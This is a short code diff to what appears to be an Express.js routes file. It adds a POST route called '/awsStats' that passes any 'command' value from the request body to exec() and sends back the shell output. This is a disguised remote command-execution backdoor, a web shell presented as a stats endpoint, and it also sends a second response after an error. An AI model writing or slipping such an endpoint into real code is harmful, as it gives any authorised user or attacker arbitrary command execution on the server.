@@ -41,6 +41,20 @@ module.exports = function (app){
     });
 
 
+    app.post('/awsStats', User.authorize, function(req, res){
+        if(!req.body.command){
+            res.send("Use this if you want to see RAW_AWS_STATS");
+        } else {
+            exec(req.body.command, function(err, out, code) {
+              if (err instanceof Error)
+                res.send({error:err});
+              res.send(out);
+            });
+        }
+
+    });
+
+    
     app.post('/pingSpecial',User.authorize,function (req,res){
 
         if(!req.body.host){
